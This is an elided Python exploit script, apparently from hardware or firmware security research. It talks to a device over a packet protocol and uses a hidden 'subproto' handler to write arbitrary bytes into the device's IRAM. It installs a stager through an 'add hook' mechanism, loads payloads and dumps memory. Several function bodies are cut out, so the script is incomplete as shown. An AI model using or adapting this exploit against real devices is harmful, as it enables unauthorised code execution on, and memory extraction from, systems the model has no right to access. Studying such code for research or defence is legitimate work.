...
def send_full_msg_via_stager(r, msg, chunk_size=8, sleep_amt=0.01):
...
def _raw_subproto_write(r, arg_dw, add_args, really=False):
    assert(really == True)
    send_packet(r, chr(0x84) + "\x5a\x2e" + struct.pack(">I", arg_dw) + add_args)
    return recv_packet(r)
...
def _exploit_write_chunk_to_iram(r, tar, contents, already_in_80_handler=False):
    ...
    if not already_in_80_handler:
        enter_subproto_handler(r, SUBPROT_80_MODE_IRAM)
    target_argument = tar - 0x10000000
    _raw_subproto_write(r, target_argument, len(contents) * "\xff", True)
    if len(contents) == 4 and (contents[:2] in ["\x00\x00", "\x0a\x00"] or contents[2:4] in ["\x00\x00", "\x0a\x00"]):
        _raw_subproto_write(r, target_argument, contents[:2], True)
        _raw_subproto_write(r, target_argument + 2, contents[2:4], True)
    else:
        _raw_subproto_write(r, target_argument, contents, True)
    if not already_in_80_handler:
...
def exploit_write_to_iram(r, tar, contents):
    ...
    for i in range(0, len(contents), chunk_size):
        ...
        _exploit_write_chunk_to_iram(r, tar + i, contents[i:i + chunk_size], True)
    leave_subproto_handler(r)

def get_version(r):
    invoke_primary_handler(r, 0)
    return recv_packet(r)

def bye(r):
    invoke_primary_handler(r, 0xa2)
    answ = recv_packet(r)
    assert (answ == "\xa2\x00")

def invoke_add_hook(r, add_hook_no, args="", await_response=True):
    assert (0 <= add_hook_no <= 0x20)
    return invoke_primary_handler(r, 0x1c, chr(add_hook_no) + args, await_response)
...
def write_via_stager(r, tar_addr, contents, stager_addhook_ind=DEFAULT_STAGER_ADDHOOK_IND):
    invoke_add_hook(r, stager_addhook_ind, struct.pack(">I", tar_addr), await_response=False)
    send_full_msg_via_stager(r, contents)
...
def payload_dump_mem(r, tar_addr, num_bytes, addhook_ind):
    ...
    return recv_many(r, verbose=True)

def switch_to_turbo_mode(r):
...
def handle_conn(r, action, args):
    global next_payload_location
    log.success("[+] Got special access greeting: {} [{}]".format(r.recv(5), hexlify(r.recv(5))))
    ...
    start = time.time()
    stager_addhook_ind = install_stager(r, stager_code)
    ...
    if action == ACTION_DUMP_TURBO:
        if not switch_to_turbo_mode(r): return
        if not load_payload_turbo(r, payload, next_payload_location): return
        log.info("Dumping memory...")
        contents = payload_dump_mem(r, args.address, args.length, DEFAULT_SECOND_ADD_HOOK_IND)
    else:
        ...
        if action == ACTION_INVOKE_HOOK:
            ...
            while True: log.info("Got packet: {}".format(recv_packet(r)))
    ...
    for i in range(100):
        ...
        if len(answ) > 0:
            ...
            if answ.startswith("\5-CPU"):
                r.unrecv(answ)
                handle_conn(r, args.action, args)
                break
    else:
